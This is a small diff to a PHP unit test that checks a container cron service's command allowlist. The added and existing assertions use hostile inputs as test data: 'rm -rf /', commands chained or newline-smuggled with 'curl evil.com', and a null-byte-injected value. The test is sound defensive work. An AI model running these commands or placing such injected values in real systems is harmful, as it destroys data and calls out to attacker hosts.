@@ -50,6 +50,8 @@ class ContainerCronServiceTest extends TestCase
     {
         $this->assertFalse($this->service->isAllowedCommand('rm -rf /'));
         $this->assertFalse($this->service->isAllowedCommand('php artisan schedule:run; curl evil.com'));
+        $this->assertFalse($this->service->isAllowedCommand("php artisan schedule:run\ncurl evil.com"));
+        $this->assertFalse($this->service->isAllowedCommand("php artisan schedule:run\0ignored"));
         $this->assertTrue($this->service->isAllowedCommand('php artisan schedule:run'));
     }
 
